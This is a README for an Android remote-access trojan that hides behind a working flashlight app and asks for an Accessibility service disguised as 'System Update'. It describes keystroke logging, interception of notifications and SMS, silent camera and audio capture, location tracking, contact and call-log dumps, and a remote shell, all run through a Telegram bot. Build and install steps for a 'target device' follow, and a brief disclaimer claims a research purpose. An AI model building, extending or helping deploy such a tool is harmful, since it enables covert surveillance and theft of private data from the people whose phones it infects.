# System Security Monitor (GON_RAT)

A sophisticated Android monitoring and administration tool designed for authorized security testing and research. This application uses a functional "Torch" app as a decoy while executing advanced monitoring tasks in the background.

## 🚀 Key Features

*   **24/7 Persistence**: Utilizes Foreground Services, WakeLocks, and Battery Optimization bypass to remain active indefinitely.
*   **Remote Control**: Fully integrated with Telegram Bot API for real-time remote commands and data delivery.
*   **Advanced Keylogger**: 
    *   Continuous local logging to `keystrokes.txt` (offline support).
    *   Automatic background upload to Telegram when log size reaches threshold.
    *   On-demand retrieval using the `/alllog` command.
*   **Notification Interception**: Captures incoming notifications from all third-party applications (WhatsApp, SMS, etc.) and forwards them to the bot.
*   **Media Surveillance**: Remote camera snapshots (front/back), audio recording, and automated gallery observation.
*   **Data Extraction**: Remote dumping of Call Logs, Contacts, and SMS messages.
*   **Process Isolation**: Core monitoring services run in an independent `:remote` process for maximum stability.
*   **Remote Shell**: Execute terminal commands directly via the Telegram bot.

## 🛠️ Remote Commands

| Command | Description |
| --- | --- |
| `/ping` | Check if the system is online. |
| `/status` | Get device hardware info, root status, and time. |
| `/alllog` | Retrieve the complete local keystroke history and clear the file. |
| `/screenshot` | Capture a real-time screenshot of the device. |
| `/camera_front` | Take a silent snapshot using the front camera. |
| `/camera_back` | Take a silent snapshot using the back camera. |
| `/record <sec>` | Record ambient audio for a specified duration. |
| `/location` | Get the current GPS coordinates of the device. |
| `/dump_sms` | Export all SMS messages from the device. |
| `/shell <cmd>` | Execute a remote shell command. |

## ⚙️ Setup Instructions

1.  **Configure Credentials**:
    *   Open `app/src/main/java/com/pentest/torch/Config.kt`.
    *   Enter your `BOT_TOKEN` and `CHAT_ID` obtained from @BotFather.

2.  **Build**:
    *   Compile the project using Android Studio or Gradle: `./gradlew assembleDebug`.

3.  **Deployment**:
    *   Install the APK on the target device.
    *   **Crucial**: Grant the following manual permissions for full functionality:
        *   **Accessibility Service**: Enable "System Update" service.
        *   **Notification Access**: Enable for "System Update".
        *   **Battery Optimization**: Allow the app to run without restrictions.

## ⚖️ Disclaimer

This project is created for **educational and authorized security testing purposes only**. The developer assumes no liability and is not responsible for any misuse or damage caused by this program. Use of these tools without explicit permission from the device owner is illegal.

---
*Built for research and transparency in Android security.*
